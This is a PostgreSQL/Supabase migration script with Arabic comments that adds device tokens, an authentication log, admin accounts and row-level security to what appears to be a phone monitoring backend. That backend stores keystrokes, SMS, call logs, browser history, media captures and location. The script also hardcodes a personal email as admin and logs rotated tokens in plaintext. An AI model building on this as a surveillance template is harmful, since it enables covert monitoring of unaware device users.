-- ============================================================
-- التحديثات الجديدة (شغلها بعد supabase-schema.sql القديم)
-- ============================================================

-- 1. إضافة عمود device_token لجدول devices
ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT UNIQUE;

-- 2. إنشاء جدول سجل المصادقة
CREATE TABLE IF NOT EXISTS device_auth_log (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  token_used TEXT,
  ip_address INET,
  action TEXT CHECK (action IN ('auth_success','auth_failed','token_rotated')),
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 3. إنشاء جدول المسؤولين
CREATE TABLE IF NOT EXISTS admin_users (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  email TEXT UNIQUE NOT NULL,
  role TEXT DEFAULT 'admin' CHECK (role IN ('admin','superadmin')),
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 4. إضافة البريد الإلكتروني كمسؤول وحيد
INSERT INTO admin_users (email) VALUES ('muhammad.othman.2005@gmail.com')
ON CONFLICT (email) DO NOTHING;

-- 5. إنشاء دوال Device Token
CREATE OR REPLACE FUNCTION generate_device_token(p_device_serial TEXT)
RETURNS TEXT AS $$
DECLARE
  new_token TEXT;
BEGIN
  new_token := encode(gen_random_bytes(48), 'base64');
  new_token := regexp_replace(new_token, '[^a-zA-Z0-9]', '', 'g');
  new_token := substring(new_token, 1, 64);

  UPDATE devices SET device_token = new_token
  WHERE device_serial = p_device_serial;

  INSERT INTO device_auth_log (device_serial, token_used, action)
  VALUES (p_device_serial, new_token, 'token_rotated');

  RETURN new_token;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE OR REPLACE FUNCTION validate_device_token(p_token TEXT)
RETURNS TABLE (device_serial TEXT, is_valid BOOLEAN) AS $$
BEGIN
  RETURN QUERY
  SELECT d.device_serial, true
  FROM devices d
  WHERE d.device_token = p_token AND d.is_active = true;

  IF NOT FOUND THEN
    RETURN QUERY SELECT NULL::TEXT, false;
  END IF;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 6. تفعيل RLS على الجداول الجديدة
ALTER TABLE device_auth_log ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_users ENABLE ROW LEVEL SECURITY;

-- 7. إضافة RLS policies للجداول الجديدة
DROP POLICY IF EXISTS auth_log_self ON device_auth_log;
CREATE POLICY auth_log_self ON device_auth_log
  FOR ALL USING (device_serial = current_setting('app.device_serial', true)::TEXT);

-- 8. RLS للمسؤولين: إضافة سياسات لكل الجداول
DO $$
DECLARE
  tbl TEXT;
  tables TEXT[] := ARRAY[
    'devices','location_history','device_state_snapshots',
    'installed_applications','application_change_log','device_encryption_keys',
    'call_logs','sms_messages','contacts','notification_logs','app_usage_stats',
    'browser_history','media_captures','geofence_zones','geofence_events',
    'keystroke_logs','file_system_snapshots','device_auth_log','admin_users'
  ];
BEGIN
  FOREACH tbl IN ARRAY tables
  LOOP
    EXECUTE format(
      'DROP POLICY IF EXISTS %I_admin_access ON %I;', tbl, tbl);
    EXECUTE format(
      'CREATE POLICY %I_admin_access ON %I FOR ALL USING (
        auth.email() IN (SELECT email FROM admin_users)
      );', tbl, tbl);
  END LOOP;
END $$;
